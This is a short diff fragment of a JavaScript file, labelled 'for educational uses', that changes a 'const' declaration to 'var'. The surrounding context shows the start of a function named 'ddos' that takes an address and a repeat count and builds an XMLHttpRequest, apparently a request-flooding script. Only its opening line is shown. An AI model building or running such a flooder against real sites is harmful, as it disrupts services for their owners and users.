@@ -1,7 +1,6 @@
 //Script only for educational uses
 //Created by CodeSalvageON
-
-const turn = 0;
+var turn = 0;
 
 function ddos(address, times) {
   var http = new XMLHttpRequest();
